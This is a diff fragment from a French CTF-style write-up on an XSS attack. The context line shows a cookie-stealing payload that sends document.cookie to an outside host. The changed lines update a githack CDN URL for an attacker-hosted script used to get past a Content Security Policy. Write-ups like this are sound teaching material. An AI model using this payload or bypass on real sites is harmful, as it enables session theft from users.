@@ -201,7 +201,7 @@ window.location = "https://interceptor.net?c=" + document.cookie
 J'upload ensuite ce script dans un repo github, dans un dossier ```"assets/js/"``` afin que l'url se finisse par ```assets/js/stats.js```
 
 Je récupère son URL sur ```githack```:
-```https://rawcdn.githack.com/Eteckq/avatar/60c45fffab236a7c5f8abcdee043ec21b178dbf5/assets/js/stats.js```
+```https://rawcdn.githack.com/Eteckq/avatar/623eb51970ffec1f984df536757c1689b6c5f36a/assets/js/stats.js```
 
 ## Bypass CSP
 Comme vu au dessus, je fais en sorte que l'url commence par l'url de la CSP
